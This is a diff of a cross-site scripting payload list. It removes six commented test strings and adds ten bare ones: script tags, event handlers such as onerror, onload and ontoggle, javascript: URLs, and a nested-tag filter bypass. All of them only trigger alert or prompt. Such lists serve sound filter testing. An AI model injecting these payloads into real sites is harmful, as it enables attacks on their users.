@@ -1,6 +1,10 @@
-<script>alert('XSS')</script>         # Basic script tag — simplest test
-<img src=x onerror=alert('XSS')>       # Image error event — no script tag needed
-<svg onload=alert('XSS')>              # SVG load event
-"><script>alert('XSS')</script>       # Break out of an HTML attribute first
-<body onload=alert('XSS')>             # Body load event
-<ScRiPt>alert('XSS')</ScRiPt>         # Mixed case — bypasses case-sensitive filters
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<a href="javascript:alert(1)">Click Me</a>
+'"><script>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<BODY ONLOAD=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
